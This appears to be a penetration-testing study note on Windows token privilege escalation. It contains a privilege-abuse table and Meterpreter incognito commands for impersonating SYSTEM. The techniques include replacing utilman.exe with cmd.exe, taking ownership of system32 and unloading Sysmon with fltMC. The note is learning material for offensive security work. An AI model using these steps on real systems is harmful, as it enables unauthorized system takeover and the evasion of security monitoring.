### What are Tokens
![[Pasted image 20210715170212.png]]

##### When in a command shell type this to see all the privileges the user have
```powershell
whoami /priv
```

##### In a meterpreter shell type this to see all the privileges the user have
```powershell
getprivs
```

###  Impersonation Privileges

Full privileges cheatsheet at https://github.com/gtworek/Priv2Admin, summary below will only list direct ways to exploit the privilege to obtain an admin session or read sensitive files.

| Privilege | Impact | Tool | Execution path | Remarks |
| --- | --- | --- | --- | --- |
|`SeAssignPrimaryToken`| ***Admin*** | 3rd party tool | *"It would allow a user to impersonate tokens and privesc to nt system using tools such as potato.exe, rottenpotato.exe and juicypotato.exe"* | Thank you [Aurélien Chalot](https://twitter.com/Defte_) for the update. I will try to re-phrase it to something more recipe-like soon. |
|`SeBackup`| **Threat** | ***Built-in commands*** | Read sensitve files with `robocopy /b` |- May be more interesting if you can read %WINDIR%\MEMORY.DMP<br> <br>- `SeBackupPrivilege` (and robocopy) is not helpful when it comes to open files.<br> <br>- Robocopy requires both SeBackup and SeRestore to work with /b parameter. |
|`SeCreateToken`| ***Admin*** | 3rd party tool | Create arbitrary token including local admin rights with `NtCreateToken`. ||
|`SeDebug`| ***Admin*** | **PowerShell** | Duplicate the `lsass.exe` token.  | Script to be found at [FuzzySecurity](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1) |
|`SeLoadDriver`| ***Admin*** | 3rd party tool | 1. Load buggy kernel driver such as `szkg64.sys`<br>2. Exploit the driver vulnerability<br> <br> Alternatively, the privilege may be used to unload security-related drivers with `ftlMC` builtin command. i.e.: `fltMC sysmondrv` | 1. The `szkg64` vulnerability is listed as [CVE-2018-15732](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15732)<br>2. The `szkg64` [exploit code](https://www.greyhathacker.net/?p=1025) was created by [Parvez Anwar](https://twitter.com/parvezghh)  |
|`SeRestore`| ***Admin*** | **PowerShell** | 1. Launch PowerShell/ISE with the SeRestore privilege present.<br>2. Enable the privilege with [Enable-SeRestorePrivilege](https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1)).<br>3. Rename utilman.exe to utilman.old<br>4. Rename cmd.exe to utilman.exe<br>5. Lock the console and press Win+U| Attack may be detected by some AV software.<br> <br>Alternative method relies on replacing service binaries stored in "Program Files" using the same privilege. |
|`SeTakeOwnership`| ***Admin*** | ***Built-in commands*** |1. `takeown.exe /f "%windir%\system32"`<br>2. `icalcs.exe "%windir%\system32" /grant "%username%":F`<br>3. Rename cmd.exe to utilman.exe<br>4. Lock the console and press Win+U| Attack may be detected by some AV software.<br> <br>Alternative method relies on replacing service binaries stored in "Program Files" using the same privilege. |
|`SeTcb`| ***Admin*** | 3rd party tool | Manipulate tokens to have local admin rights included. May require SeImpersonate.<br> <br>To be verified. ||

### Potato Attacks
**When first land into the shell , see what privileges you have and run a automated script like winpeas to detect the potato attack. **

->After getting a privilege meterpreter session type the following commads
```powershell
# load incognito module
load incognito

# List the tokens you have
list_token -u

# Impersonate "NT AUTHORITY\SYSTEM" token if you have that
impersonate_token "NT AUTHORITY\SYSTEM"

# Drop Into the command shell
shell

# Check the user you landed after impersonating
whoami
```
![[Pasted image 20210715173903.png]]

### Alternate Data Streams
Sometimes data can be hidden in alternate data streams
Alternate Data Streams (ADS) are a file attribute only found on the [NTFS file system](https://technet.microsoft.com/en-us/library/cc781134(v=ws.10).aspx).

In this system a file is built up from a couple of attributes, one of them is _$Data_, aka the data attribute. Looking at the regular data stream of a text file there is no mystery. It simply contains the text inside the text file. But that is only the primary data stream.

This one is sometimes referred to as the unnamed data stream since the name string of this attribute is empty ( “” ) . So any data stream that has a name is considered alternate.

These data streams suffer from a bad reputation since they have been used and abused to write hidden data. Varying from data about where a file came from to complete malware files (e.g. [Backdoor.Rustock.A](https://www.symantec.com/security_response/writeup.jsp?docid=2006-060111-5747-99&tabid=2))

If you are up for an experiment, we can easily create and read an alternate data stream.

##### Use the following command to see the alternate data streams
```powershell
dir /R
```

-> If you want to search a directory or drive for ADS you can use this command in the root of the target:
```powershell
gci -recurse | % { gi $_.FullName -stream * } | where stream -ne ':$Data'
```

### References
https://blog.malwarebytes.com/101/2015/07/introduction-to-alternate-data-streams/
https://github.com/ohpe/juicy-potato
https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/